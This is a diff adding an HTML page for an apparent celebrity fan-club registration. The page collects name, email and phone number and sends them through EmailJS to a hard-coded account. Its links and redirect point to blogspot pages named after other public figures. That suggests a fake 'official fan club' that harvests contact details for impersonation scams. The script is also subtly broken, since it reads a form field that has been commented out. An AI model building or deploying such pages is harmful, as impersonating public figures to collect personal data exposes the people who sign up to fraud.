@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Form</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .card-title {
+            color: #1a1a1a;
+            font-size: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .form-input,
+        .form-select {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .form-input:focus,
+        .form-select:focus {
+            outline: none;
+            border-color: #4a90e2;
+            box-shadow: 0 0 0 2px rgba(74, 144, 226, 0.2);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4a90e2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .button:hover {
+            background-color: #357abd;
+        }
+
+        .button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .text-sm {
+            font-size: 14px;
+        }
+
+        .text-gray {
+            color: #666;
+        }
+
+        .link {
+            color: #4a90e2;
+            text-decoration: none;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="card-header">
+            <h2 class="card-title">Register to join <br/> michelle moron, fan club.</h2>
+        </div>
+        <form id="registrationForm">
+            <div class="form-group">
+                <label class="form-label" for="username">NAME</label>
+                <input class="form-input" id="username" name="username" type="text" placeholder="Brice Séraphin" required>
+            </div>
+           
+            <div class="form-group">
+                <label class="form-label" for="email">E-Mail
+</label>
+                <input class="form-input" id="email" name="email" type="email" placeholder="briceseraphin@gmail.com" required>
+            </div>
+            <div class="form-group">
+                <label class="form-label" for="phone">phone number</label>
+                <input class="form-input" id="phone" name="phone" type="tel" required>
+            </div>
+           <!--<div class="form-group">
+                <label class="form-label" for="city">Select city.
+</label>
+                <select class="form-select" id="city" name="city" required>
+                    <option value="">Select city.
+</option>
+                    <option value="usa">USA
+</option>
+                    <option value="canada">CANADA</option>
+                    <option value="germany">GERMANY</option>
+                </select>
+            </div>-->
+          <button id="submitButton" type="submit" class="button">Join official fan club </button>
+            <p class="text-center text-sm text-gray" style="margin-top: 1rem;">
+          
+Already a member?
+
+                <a href="https://john-legend-fan-community.blogspot.com/p/login-margin-0-padding-0-box-sizing.html" class="link">login here</a>
+            </p>
+        </form>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+   
+<script>
+    (function() {
+        emailjs.init("fHmFKY33U5r4k-Zjq");
+    })();
+
+    document.getElementById('registrationForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        // Get form elements
+        const submitButton = document.getElementById('submitButton');
+
+        // Disable submit button and show loading state
+        submitButton.disabled = true;
+        submitButton.textContent = 'Sending...';
+
+        // Get all form values
+        const templateParams = {
+            to_name: "Admin", // You can customize this
+            from_name: document.getElementById('username').value,
+            user_email: document.getElementById('email').value,
+            user_phone: document.getElementById('phone').value,
+            //user_city: document.getElementById('city').value,
+            message: `
+                New Registration Details:
+                Name: ${document.getElementById('username').value}
+                
+              
+                Email: ${document.getElementById('email').value}
+                Phone: ${document.getElementById('phone').value}
+                // City: ${document.getElementById('city').value}
+            `
+        };
+
+        // Send email using EmailJS
+        emailjs.send('service_ojes6h4', 'template_mubgmka', templateParams)
+            .then(function(response) {
+                alert('Registration form has been received. you will receive a verification message via your email within 24hrs');
+                document.getElementById('registrationForm').reset();
+                // Add redirect after successful submission
+                window.location.href = 'https://officialshannonrwatts.blogspot.com/p/joboard-about-margin-0-padding-0-box.html';
+            })
+            .catch(function(error) {
+                alert('Failed to send email. Please try again.');
+                console.error('Email error:', error);
+            })
+            .finally(function() {
+                submitButton.disabled = false;
+                submitButton.textContent = 'Become a verified fan';
+            });
+    });
+</script>
+
+</body>
+</html>
